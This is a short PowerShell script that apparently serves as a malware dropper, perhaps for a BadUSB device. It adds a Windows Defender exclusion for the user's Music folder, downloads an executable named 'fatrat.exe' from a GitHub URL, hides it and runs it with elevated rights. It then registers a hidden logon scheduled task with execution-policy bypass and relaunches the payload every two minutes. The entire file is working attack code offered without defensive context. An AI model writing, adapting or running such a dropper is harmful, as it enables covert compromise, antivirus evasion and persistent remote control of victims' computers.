function Do-A {

    schtasks /create /tn "Script2Task" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\script2.ps1" /sc onlogon /rl highest /f


    while ($true) {
    Start-Process "$env:USERPROFILE\Music\fatrat.exe"
    Start-Sleep -Seconds 120
}

}

function Do-B {
    
    $path = Join-Path $env:USERPROFILE "Music\fatrat.exe"
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Music"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

$url = "https://github.com/armanina444/deadly-spark-attiny85/raw/refs/heads/main/fatrat.exe"
$dest = "$env:USERPROFILE\Music\fatrat.exe"

Invoke-WebRequest -Uri $url -OutFile $dest

Set-ItemProperty -Path $dest -Name Attributes -Value Hidden

Start-Process -FilePath $dest -Verb RunAs   


}

$path = Join-Path $env:USERPROFILE "Music\fatrat.exe"

if (Test-Path $path) {
    Do-A
}
else {
    Do-B
    Do-A
}
